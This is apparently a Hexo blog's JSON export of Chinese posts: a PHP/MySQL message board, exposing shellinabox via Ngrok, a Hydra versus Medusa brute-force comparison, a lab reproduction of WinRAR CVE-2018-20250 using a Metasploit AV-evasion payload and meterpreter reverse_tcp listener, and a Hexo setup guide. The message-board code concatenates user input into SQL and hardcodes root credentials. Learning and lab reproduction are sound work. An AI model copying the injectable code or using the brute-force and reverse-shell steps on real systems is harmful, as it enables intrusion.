$account=&quot;root&quot;; $password=&quot;root&quot;; $this-&gt;database=mysql_connect($dbhost,$account,$password); if($this-&gt;database)&#123; echo &quot;DB connected.&quot;; &#125;else &#123; echo &quot;DB connect failed.&quot;; &#125; $result=mysql_select_db(&quot;db_messages&quot;,$this-&gt;database); if($result)&#123; echo &quot;DB select successed.&quot;; &#125;else&#123; echo &quot;DB select failled.&quot;; &#125; &#125; function __destruct()&#123; //disconnect mysql_close($this-&gt;database); &#125;&#125; DB类的两个方法分别是构造函数和析构函数。构造函数在对象实例化时执行，其中包含mySQL数据库的配置信息：IP地址、账户、密码。使用PHP自带的mysql_connect()函数连接mySQL数据库，使用PHP自带的mysql_select_db()函数选择数据库。析构函数在将对象销毁时断开与mySQL数据库的连接，同样适用了PHP自带的mysql_close()函数。 3.2.2MessageBoard继承DB1class MessageBoard extends DB 通过继承DB类，使MessageBoard类可以使用DB类中的方法和属性。 在继承父类后，子类可以使用父类的属性和方法，但是因为子类已经声明了自己的构造函数，所以无法直接继承父类的构造函数，可以使用下面的代码来继承父类的构造函数。 1parent::__construct(); 3.3数据库的读写3.3.1SQL语法1INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;chessur&apos;,&apos;2019-3-24&apos;,&apos;Hello World&apos;) 1SELECT * FROM `all_messages`; INSERT INTO是向数据库中插入数据SELECT是从数据库中选择数据 3.3.2saveData()1234function saveData($u,$t,$c)&#123; $query=&quot;INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;&quot;.$u.&quot;&apos;,&apos;&quot;.$t.&quot;&apos;,&apos;&quot;.$c.&quot;&apos;)&quot;; mysql_query($query); &#125; 在连接了mySQL数据库后，我们可以将savaData()方法改写为真正的方法，而不再只是测试的作用。mysql_query()函数可以执行一条mySQL语句。 3.3.3loadData()123456789function loadData()&#123; $query=&quot;SELECT * FROM `all_messages`;&quot;; $result=mysql_query($query); while($row=mysql_fetch_array($result))&#123; $temp=new Message($row[&apos;name&apos;],$row[&apos;time&apos;],$row[&apos;content&apos;]); array_push($this-&gt;messages,$temp); &#125; &#125; $query中的mySQL语句是选择表中所有数据，使用mysql_query($query)找到所有数据后，将全部留言放入messages这个数组中，完成留言数据的加载。 4.mysql函数4.1mysql_query()mysql_query() 函数执行一条 MySQL 语句。 1mysql_query(query,connection) 1mysql_query($query) 4.2mysql_connect()mysql_connect() 函数打开非持久的 MySQL 连接。 1mysql_connect(server,user,pwd,newlink,clientflag) 1mysql_open($this-&gt;database) 4.3mysql_select_db()mysql_select_db() 函数设置活动的 MySQL 数据库。如果成功，则该函数返回 true。如果失败，则返回 false。 1mysql_select_db(database,connection) 1mysql_select_db(&quot;db_messages&quot;,$this-&gt;database) 4.4mysql_close()mysql_close() 函数关闭非持久的 MySQL 连接。 1mysql_close(link_identifier) 1mysql_close($this-&gt;database) 4.5mysql_fetch_array()mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 1mysql_fetch_array(data,array_type) 1mysql_fetch_array($result) 4.6SELECTSELECT 语句用于从数据库中选取数据。 1234SELECT column_name,column_nameFROM table_name;SELECT * FROM table_name; 1SELECT * FROM `all_messages`; 4.7INSERT INTO SELECTINSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。 1234567INSERT INTO table2SELECT * FROM table1;INSERT INTO table2(column_name(s))SELECT column_name(s)FROM table1; 1INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;&quot;.$u.&quot;&apos;,&apos;&quot;.$t.&quot;&apos;,&apos;&quot;.$c.&quot;&apos;) 5.缺陷1.没有删除功能。 2.刷新页面时表单会重复提交。 3.时间显示不正确。 1234567891011121314151617181920212223242526272829303132333435363738/*date()函数参数*/d - 一个月中的第几天（从 01 到 31）D - 星期几的文本表示（用三个字母表示）j - 一个月中的第几天，不带前导零（1 到 31）l（&apos;L&apos; 的小写形式）- 星期几的完整的文本表示N - 星期几的 ISO-8601 数字格式表示（1表示Monday[星期一]，7表示Sunday[星期日]）S - 一个月中的第几天的英语序数后缀（2 个字符：st、nd、rd 或 th。与 j 搭配使用）w - 星期几的数字表示（0 表示 Sunday[星期日]，6 表示 Saturday[星期六]）z - 一年中的第几天（从 0 到 365）W - 用 ISO-8601 数字格式表示一年中的星期数字（每周从 Monday[星期一]开始）F - 月份的完整的文本表示（January[一月份] 到 December[十二月份]）m - 月份的数字表示（从 01 到 12）M - 月份的短文本表示（用三个字母表示）n - 月份的数字表示，不带前导零（1 到 12）t - 给定月份中包含的天数L - 是否是闰年（如果是闰年则为 1，否则为 0）o - ISO-8601 标准下的年份数字Y - 年份的四位数表示y - 年份的两位数表示a - 小写形式表示：am 或 pmA - 大写形式表示：AM 或 PMB - Swatch Internet Time（000 到 999）g - 12 小时制，不带前导零（1 到 12）G - 24 小时制，不带前导零（0 到 23）h - 12 小时制，带前导零（01 到 12）H - 24 小时制，带前导零（00 到 23）i - 分，带前导零（00 到 59）s - 秒，带前导零（00 到 59）u - 微秒（PHP 5.2.2 中新增的）e - 时区标识符（例如：UTC、GMT、Atlantic/Azores）I（i 的大写形式）- 日期是否是在夏令时（如果是夏令时则为 1，否则为 0）O - 格林威治时间（GMT）的差值，单位是小时（实例：+0100）P - 格林威治时间（GMT）的差值，单位是 hours:minutes（PHP 5.1.3 中新增的）T - 时区的简写（实例：EST、MDT）Z - 以秒为单位的时区偏移量。UTC 以西时区的偏移量为负数（-43200 到 50400）c - ISO-8601 标准的日期（例如 2013-05-05T16:34:42+00:00）r - RFC 2822 格式的日期（例如 Fri, 12 Apr 2013 12:01:05 +0200）U - 自 Unix 纪元（January 1 1970 00:00:00 GMT）以来经过的秒数 将上面代码中的h改成H即为24小时 1date(&quot;Y-m-d H:i:s&quot;,time()) 时区设置在php.ini中搜索”timezone”修改 6.参考[1] php留言板製作 [2] PHP 教程 [3] SQL 教程","categories":[],"tags":[]},{"title":"'Kali使用shellinabox，并使用Ngrok将shellinabox映射到外网'","slug":"Kail-Use-Shellinabox&Ngrok","date":"2019-03-21T11:49:19.000Z","updated":"2019-03-25T12:19:28.357Z","comments":true,"path":"2019/03/21/Kail-Use-Shellinabox&Ngrok/","link":"","permalink":"https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/","excerpt":"1.shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。 2.shellinabox安装使用的是系统是Kali Linux 2019，在终端输入 1apt install shellinabox 如果提示无法找到包，请添加国内更新源 123456789gedit /etc/apt/sources.list//添加下列更新源#清华大学 [更新源]deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学[更新源]deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free","text":"1.shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。 2.shellinabox安装使用的是系统是Kali Linux 2019，在终端输入 1apt install shellinabox 如果提示无法找到包，请添加国内更新源 123456789gedit /etc/apt/sources.list//添加下列更新源#清华大学 [更新源]deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学[更新源]deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 3.shellinabox参数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859List of command line options: -b, --background[=PIDFILE] run in background -c, --cert=CERTDIR set certificate dir (default: $PWD) --cert-fd=FD set certificate file from fd --css=FILE attach contents to CSS style sheet --cgi[=PORTMIN-PORTMAX] run as CGI -d, --debug enable debug mode -f, --static-file=URL:FILE serve static file from URL path -g, --group=GID switch to this group (default: nogroup) -h, --help print this message --linkify=[none|normal|aggressive] default is &quot;normal&quot; --localhost-only only listen on 127.0.0.1 --no-beep suppress all audio output -n, --numeric do not resolve hostnames -m, --messages-origin=ORIGIN allow iframe message passing from origin --pidfile=PIDFILE publish pid of daemon process -p, --port=PORT select a port (default: 4200) -s, --service=SERVICE define one or more services -t, --disable-ssl disable transparent SSL support --disable-ssl-menu disallow changing transport mode --disable-utmp-logging disable logging to utmp and wtmp -q, --quiet turn off all messages --unixdomain-only=PATH:USER:GROUP:CHMOD listen on unix socket -u, --user=UID switch to this user (default: nobody) --user-css=STYLES defines user-selectable CSS options -v, --verbose enable logging messages --version prints version information --disable-peer-check disable peer check on a sessionDebug, quiet, and verbose are mutually exclusive.One or more --service arguments define services that should be made availablethrough the web interface: SERVICE := &lt;url-path&gt; &apos;:&apos; APP APP := &apos;LOGIN&apos; | &apos;SSH&apos; [ : &lt;host&gt; ] | USER &apos;:&apos; CWD &apos;:&apos; CMD USER := &apos;AUTH&apos; | &lt;username&gt; &apos;:&apos; &lt;groupname&gt; CWD := &apos;HOME&apos; | &lt;dir&gt; CMD := &apos;SHELL&apos; | &lt;cmdline&gt;&lt;cmdline&gt; supports variable expansion: $&#123;columns&#125; - number of columns $&#123;gid&#125; - gid id $&#123;group&#125; - group name $&#123;home&#125; - home directory $&#123;lines&#125; - number of rows $&#123;peer&#125; - name of remote peer $&#123;realip&#125; - value of HTTP header field &apos;X-Real-IP&apos; $&#123;uid&#125; - user id $&#123;url&#125; - the URL that serves the terminal session $&#123;user&#125; - user nameOne or more --user-css arguments define optional user-selectable CSS options.These options show up in the right-click context menu: STYLES := GROUP &#123; &apos;;&apos; GROUP &#125;* GROUP := OPTION &#123; &apos;,&apos; OPTION &#125;* OPTION := &lt;label&gt; &apos;:&apos; [ &apos;-&apos; | &apos;+&apos; ] &lt;css-file&gt;OPTIONs that make up a GROUP are mutually exclusive. But individual GROUPs areindependent of each other. 12345678-b,--background[=PIDFILE] 后台运行-c, --cert=CERTDIR 指定证书目录（默认当前工作路径）-p, --port=PORT 更改端口 (默认: 4200)-t, --disable-ssl 关闭SSL传输-q, --quiet 安静模式，禁用所有信息-u, --user=UID 设置登录用户 (默认: nobody)-v, --verbose 开启登录信息提示--version 显示版本信息 4.shellinabox启动1shellinaboxd -b -t 启动服务之后，在浏览器访问http://IP:4200默认4200端口，可以自己修改shellinabox默认禁止root登陆，所以Kali系统需要新建一个用户登录 5.使用Ngrok将服务映射到外网5.1建立隧道在Ngrok建立隧道，注意本地端口填写启动shellinabox的端口 5.2开启映射123unzip linux_amd64.zipcd /Desktop/linux_amd64./sunny clientid 隧道id 5.3通过外网登陆直接输入URL即可登录","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'Medusa和Hydra对比'","slug":"Brief-Introduction-on-Medusa&Hydra","date":"2019-03-18T11:51:27.000Z","updated":"2019-03-25T12:19:37.821Z","comments":true,"path":"2019/03/18/Brief-Introduction-on-Medusa&Hydra/","link":"","permalink":"https://chirec.github.io/2019/03/18/Brief-Introduction-on-Medusa&Hydra/","excerpt":"1.介绍1.1Hydra Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system. THIS TOOL IS FOR LEGAL PURPOSES ONLY! There are already several login hacker tools available, however, none does either support more than one protocol to attack or support parallized connects. It was tested to compile cleanly on Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS. Currently this tool supports the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. However the module engine for new services is very easy so it won’t take a long time until even more services are supported. Your help in writing, enhancing or fixing modules is highly appreciated!! :-) 1.2Medusa Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently. Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing. Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing. Multiple protocols supported. Many services are currently supported (e.g. SMB, HTTP, POP3, MS-SQL, SSHv2, among others). Application stability. Maybe I’m just lame, but Hydra frequently crashed on me. I was no longer confident that Hydra was actually doing what it claimed to be. Rather than fix Hydra, I decided to create my own buggy application which could crash in new and exciting ways.","text":"1.介绍1.1Hydra Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system. THIS TOOL IS FOR LEGAL PURPOSES ONLY! There are already several login hacker tools available, however, none does either support more than one protocol to attack or support parallized connects. It was tested to compile cleanly on Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS. Currently this tool supports the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. However the module engine for new services is very easy so it won’t take a long time until even more services are supported. Your help in writing, enhancing or fixing modules is highly appreciated!! :-) 1.2Medusa Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently. Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing. Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing. Multiple protocols supported. Many services are currently supported (e.g. SMB, HTTP, POP3, MS-SQL, SSHv2, among others). Application stability. Maybe I’m just lame, but Hydra frequently crashed on me. I was no longer confident that Hydra was actually doing what it claimed to be. Rather than fix Hydra, I decided to create my own buggy application which could crash in new and exciting ways. 2.参数介绍2.1Hydra 123456789101112131415161718192021222324252627hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]-R 恢复上一次的会话-I 忽略存在的恢复文件-S SSL连接-s 端口号-l 尝试登陆名-L 从文件中导入登录名-p 尝试密码-P 从文件中导入密码-e nsr n尝试空密码 s尝试与用户名相同的密码 r反向登陆循环-c TIME 设置尝试登陆等待时间-4 / -6 使用IPV4地址或IPV6地址-v / -V 详细信息模式/显示每次尝试的用户名+密码/调试模式-O 使用旧版本SSL v2和v3-q 不显示连接错误信息-h 帮助-M 从文件中导入服务类型-f / -F 在找到第一个账号/密码后，停止破解server 目标IPservice 支持的服务类型支持的服务类型：adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmppExamples：hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 hydra -l admin -p password ftp://[192.168.0.0/24]/ hydra -L logins.txt -P pws.txt -M targets.txt ssh 2.2Medusa 1234567891011121314151617181920212223242526Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]-h [TEXT] 目标IP-H [FILE] 目标主机文件-u [TEXT] 用户名-U [FILE] 用户名文件-p [TEXT] 密码-P [FILE] 密码文件-C [FILE] 组合条目文件-O [FILE] 文件日志信息-e [n/s/ns] N意为空密码，S意为密码与用户名相同-M [TEXT] 模块执行名称-m [TEXT] 传递参数到模块-d 显示所有的模块名称-n [NUM] 使用非默认端口-s 启用SSL-r [NUM] 重试间隔时间，默认为3秒-t [NUM] 设定线程数量-L 并行化，每个用户使用一个线程-f 在找到第一个账号/密码后，停止破解-q 显示模块的使用信息-v [NUM] 详细级别（0-6详细）-w [NUM] 错误调试级别（0-10）-V 显示版本-Z [TEXT] 继续扫描上一次Example：medusa -M ssh -u root -P passwd.txt -h 192.168.126.130 -f -v 6 3.实验3.1暴力破解SSH3.1.1Hydra1hydra -l chessur -P passwd.txt ssh://192.168.126.130 3.1.2Medusa1medusa -M ssh -u chessur -P passwd.txt -h 192.168.126.130 -F -v 6 3.2暴力破解FTP3.2.1Hydra1hydra -l ftp1 -P passwd.txt ssh://192.168.126.130 3.2.2Medusa1medusa -M ftp -u ftp1 -P passwd.txt -h 192.168.126.130 -f -v 6 4.总结1.Medusa比Hydra稳定，但是破解速度比较慢。 2.SSH尝试速度比FTP尝试速度慢。 3.Medusa支持参数和服务类型比Hydra少，可能是很久不更新的原因。 5.参考[1] thc-hydra-README [2] Medusa Parallel Network Login Auditor","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'WinRAR目录穿越漏洞复现（CVE-2018-20250）'","slug":"Writeup-on-CVE-2018-20250","date":"2019-03-15T11:25:33.000Z","updated":"2019-03-24T07:50:57.816Z","comments":true,"path":"2019/03/15/Writeup-on-CVE-2018-20250/","link":"","permalink":"https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/","excerpt":"1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/ 2.漏洞影响版本 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.漏洞复现环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.126.128 安装WinRAR版本为5.6.1，关闭防火墙 攻击机 Kali Linux 64 Bit 2019.1a 192.168.126.126 Metasploit版本为5.0.2 攻击机 WIndows10（64bit） 安装Python3.7.2 exp下载：https://github.com/WyAtu/CVE-2018-20250/","text":"1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/ 2.漏洞影响版本 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.漏洞复现环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.126.128 安装WinRAR版本为5.6.1，关闭防火墙 攻击机 Kali Linux 64 Bit 2019.1a 192.168.126.126 Metasploit版本为5.0.2 攻击机 WIndows10（64bit） 安装Python3.7.2 exp下载：https://github.com/WyAtu/CVE-2018-20250/ 4.漏洞复现过程4.1使用Metasploit5生成免杀Payload123456789msfconsoleuse evasion/windows/windows_defender_exeshow infoset filename WinRAR.exeset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.126.126set lport 10260run 4.2使用exp生成恶意程序12345cd /root/Desktopgit clone https://github.com/WyAtu/CVE-2018-20250.gitcd CVE-2018-20250cp /root/.msf4/local/WinRAR.exe ./vim exp.py 将exp.py中的evil_filename = “calc.exe”改为”WinRAR.exe” 将CVE-2018-20250文件夹复制到Windows10中，执行 1python exp.py 生成恶意程序test.rar 4.3在靶机上运行恶意程序将test.rar复制到Windows7上，解压运行 4.4在Kali Linux上执行Metasploit监听1234567msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.126.126set lport 10260run 4.5控制靶机Windows7重启之后，Kali Linux会收到会话，此时执行shell即可获得靶机权限。 5.总结刚刚学了2个星期的渗透测试，仅仅做了漏洞复现，没有分析漏洞原理。 6.参考文章[1] Extracting a 19 Year Old Code Execution from WinRAR [2] WinRAR目录穿越漏洞浅析及复现（CVE-2018-20250） [3] WinRAR远程代码执行漏洞结合Metasploit+Ngrok实现远程上线","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://chirec.github.io/tags/漏洞复现/"}]},{"title":"'Hexo+GitHub搭建Blog过程'","slug":"How-to-Creat-a-Blog-with-Hexo&GitHub","date":"2019-03-14T12:43:46.000Z","updated":"2019-04-14T02:05:34.536Z","comments":true,"path":"2019/03/14/How-to-Creat-a-Blog-with-Hexo&GitHub/","link":"","permalink":"https://chirec.github.io/2019/03/14/How-to-Creat-a-Blog-with-Hexo&GitHub/","excerpt":"1.安装环境1.安装Node.js：在Node.js官网下载最新版本 2.安装Git for Windows：在git官网下载，选择Windows 3.安装cmder：在cmder官网下载，Git Bash并不好用，所以选择使用cmder 4.配置环境变量：需要配置环境变量的有cmder、Git、Node.js。找到安装地址复制路径，右击我的电脑-属性-点击左边高级系统设置-点击环境变量-在下方系统变量中找到Path点击编辑，然后新建-添加环境变量，三个环境变量都添加之后点击确定。这里提供添加完环境变量的图片 2.创建GitHub博客新建一个名为 用户名.github.io的仓库。例如，我的GitHub用户名是ChireC，那么我创建的仓库名就是ChireC.github.io，将来的Blog地址就是https://chirec.github.io/。 注意，Username和name并不一样。","text":"1.安装环境1.安装Node.js：在Node.js官网下载最新版本 2.安装Git for Windows：在git官网下载，选择Windows 3.安装cmder：在cmder官网下载，Git Bash并不好用，所以选择使用cmder 4.配置环境变量：需要配置环境变量的有cmder、Git、Node.js。找到安装地址复制路径，右击我的电脑-属性-点击左边高级系统设置-点击环境变量-在下方系统变量中找到Path点击编辑，然后新建-添加环境变量，三个环境变量都添加之后点击确定。这里提供添加完环境变量的图片 2.创建GitHub博客新建一个名为 用户名.github.io的仓库。例如，我的GitHub用户名是ChireC，那么我创建的仓库名就是ChireC.github.io，将来的Blog地址就是https://chirec.github.io/。 注意，Username和name并不一样。 3.配置SSH key运行之前安装好的cmder，输入以下命令创建SSH密钥 1ssh-keygen -t rsa -C 邮件地址 执行命令后，点击三次Enter，会生成一个名为.ssh的文件夹在用户目录下，使用记事本打开文件夹中的id_rsa.pub文件，将文件内容复制，打开GitHub主页，点击右上方头像，再点击下拉菜单中的Setting，点击左侧菜单中的SSH and GPG keys，点击右边的绿色New SSH key按钮添加新的SSH kye 在Key中粘贴刚刚复制的内容，点击下方绿色Add SSH key按钮，即可完成配置SSH key。 回到cmder中，输入以下命令测试是否成功配置SSH key 1ssh -T git@github.com 提示Are you sure you want to continue connecting (yes/no)，输入yes，若看到 Hi username！You’ve successfully authenticated, but GitHub does not provide shell access. 则表示成功配置SSH key。 再输入以下命令进一步配置： 12git config --global user.name username //username即为用户名git config --global user.email email //email为创建GitHub时的邮箱 4.安装Hexo首先，在你的硬盘中创建一个存放你自己Blog文件的文件夹，如D:\\Blog，然后在cmder中输入以下代码： 1234567d: //跳转盘符cd Blog //跳转到存放Blog文件的文件夹npm install -g hexo //安装hexonpm install hexo-deployer-git --save //安装上传服务hexo init //初始化hexo g //生成Blog文件hexo s //启动服务 执行hexo s后，可以在本地预览Blog，打开浏览器访问http://localhost:4000即可查看内容。 修改主题，首先打开cmder，然后输入以下命令，以hexo-theme-yilia为例： 12cd Bloggit clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 下载的主题会存在Blog文件夹下的themes文件下，将Blog文件夹下的_config.yml中的theme: landscape改为theme: yilia，然后执行hexo g重新生成。 5.上传到GitHub更改配置文件_config.yml中deploy选项： 1234deploy: type: git repository: git@github.com:username/username.github.io.git branch: master 更改完成之后，在cmder中输入： 1hexo d 即可将Blog上传到GitHub。 6.写博客打开cmder，跳转到Blog的根目录，执行命令： 1hexo new &apos;name&apos; 执行成功后，会显示生成的md文件的位置，打开这个文件即可开始编写Blog，我使用的是Typora进行编写。 7.在Hexo中插入图片首先，在_config.yml中，将post_asset_folder改为true，这样设置之后，当我们执行 1hexo new &apos;New Page&apos; 后，会创建一个和文章名相同的文件夹，将要插入的图片放进这个文件夹中，图片名称不要太长，太长似乎不会正确显示。 7.1使用插件hexo-asset-image插入图片安装hexo插件 1npm install hexo-asset-image --save 安装插件之后，在生成静态页面时，插件会更新正确的图片link 使用Typora编写markdown时，可以在文件-偏好设置-图片插入-复制到指定目录中输入./${filename}就可以直接将图片放到之前生成的文件夹中 7.2使用标签插入图片1&#123;% asset_img 图片名 图片解释 %&#125; 即可插入图片 8.重装系统后再次使用Hexo重装系统之后，之前的一些设置会丢失，再次执行一遍命令即可。需要再完成一遍的步骤有安装Node.js、安装Git、配置SSH key、安装Hexo。安装Hexo这一步，若之前博客的文件夹还存在只需要执行 1234d: //跳转盘符cd Blog //跳转到存放Blog文件的文件夹npm install -g hexo //安装hexonpm install hexo-deployer-git --save //安装上传服务 若之前的博客不存在了，就要执行hexo初始化 1hexo init 完成之后，就可以继续写博客了。注：一定要及时备份博客的source文件夹、_config.yml、themes文件夹。source文件夹中是md格式的文章，另外两个则是整个博客的配置文件和主题样式。 9.参考文章[1] 使用hexo+github搭建免费个人博客详细教程 [2] hexo博客图片问题 [3] 开始使用-NexT 使用文档","categories":[],"tags":[]}]}